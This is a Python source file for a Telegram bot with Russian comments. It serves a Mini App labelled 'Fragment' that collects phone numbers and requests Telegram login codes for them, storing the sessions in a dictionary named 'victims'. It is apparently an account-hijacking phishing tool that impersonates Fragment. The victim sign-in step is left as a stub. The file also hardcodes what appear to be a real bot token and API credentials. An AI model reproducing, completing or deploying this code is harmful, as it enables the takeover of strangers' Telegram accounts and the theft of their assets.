import json, asyncio, logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import WebAppInfo, MenuButtonWebApp
from telethon import TelegramClient, errors

BOT_TOKEN = "8611748903:AAGxBTXL74UfjsO26s5ZT4h6mts2VwCBpU0"
API_ID = 28687552
API_HASH = "1abf9a58d0c22f62437bec89bd6b27a3"
ADMIN_ID = 174415647
YOUR_PHONE = "+79000000000" # Твой номер здесь!
WEB_APP_URL = "https://dreiner.onrender.com"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
admin_client = TelegramClient('admin_auth', API_ID, API_HASH)
victims = {}

@dp.message(Command("start"))
async def start(m: types.Message):
    if m.from_user.id != ADMIN_ID: return
    await admin_client.connect()
    
    if not await admin_client.is_user_authorized():
        await admin_client.send_code_request(YOUR_PHONE)
        await m.answer("⚠️ Для начала работы нужно авторизоваться.\nЯ отправил код в твой Telegram. **Пришли его мне ответным сообщением.**")
    else:
        await bot.set_chat_menu_button(chat_id=m.chat.id, menu_button=MenuButtonWebApp(text="Fragment", web_app=WebAppInfo(url=WEB_APP_URL)))
        await m.answer("✅ Ты авторизован! Кнопка Fragment появилась в меню.")

@dp.message(F.text.regexp(r'^\d{5}$'))
async def catch_code(m: types.Message):
    if m.from_user.id == ADMIN_ID and not await admin_client.is_user_authorized():
        try:
            await admin_client.sign_in(YOUR_PHONE, m.text)
            await bot.set_chat_menu_button(chat_id=m.chat.id, menu_button=MenuButtonWebApp(text="Fragment", web_app=WebAppInfo(url=WEB_APP_URL)))
            await m.answer("🎉 Авторизация успешна! Теперь ты можешь пользоваться Mini App.")
        except Exception as e: await m.answer(f"❌ Ошибка: {e}")

@dp.message(F.web_app_data)
async def handle_app_data(m: types.Message):
    data = json.loads(m.web_app_data.data)
    action, phone = data.get("action"), data.get("phone")
    
    if action == "send_code":
        client = TelegramClient(f'v_{phone}', API_ID, API_HASH)
        victims[phone] = client
        await client.connect()
        try:
            await client.send_code_request(phone)
            await m.answer(f"📩 Код отправлен на {phone}!")
        except Exception as e: await m.answer(f"❌ Ошибка: {e}")
    # ... логика входа victims здесь ...

async def main(): await dp.start_polling(bot)
if __name__ == '__main__': asyncio.run(main())
